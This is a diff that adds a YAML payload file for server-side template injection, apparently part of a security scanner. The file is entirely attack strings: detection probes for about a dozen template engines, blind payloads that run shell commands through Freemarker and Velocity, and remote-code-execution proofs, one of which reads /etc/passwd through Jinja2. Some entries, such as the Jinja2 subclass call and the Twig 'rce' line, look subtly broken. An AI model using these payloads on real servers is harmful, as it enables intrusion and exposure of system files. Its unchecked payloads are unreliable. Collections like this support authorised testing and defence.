@@ -1,0 +1,28 @@
+# payloads/ssti.yml
+# Advanced heuristic and blind Template Injection payloads
+
+detection:
+  - template: "{{7*7}}"
+    engine: "Jinja2/Twig/Nunjucks"
+  - template: "${7*7}"
+    engine: "Freemarker/Mako/Velocity"
+  - template: "<%=7*7%>"
+    engine: "ERB/JSP"
+  - template: "#{7*7}"
+    engine: "Jade/Pug"
+  - template: "*{7*7}"
+    engine: "Spring/Thymeleaf"
+  - template: "@(7*7)"
+    engine: "Razor"
+
+blind_time:
+  jinja2: "{{range(10000000)|sum}}"
+  twig: "{{_self.env.registerUndefinedFilterCallback('sleep')}}{{_self.env.getFilter('10')}}"
+  ruby: "<%= sleep 10 %>"
+  freemarker: "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"sleep 10\") }"
+  velocity: "#set($e=\"\")#set($e=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"sleep 10\"))"
+
+rce_proofs:
+  jinja2: "{{self.__class__.__mro__[1].__subclasses__()[401](['cat','/etc/passwd'],communicate=True)}}"
+  twig: "{{_self.env.display('ghost')}}"
+  smarty: "{php}echo 'ghost';{/php}"
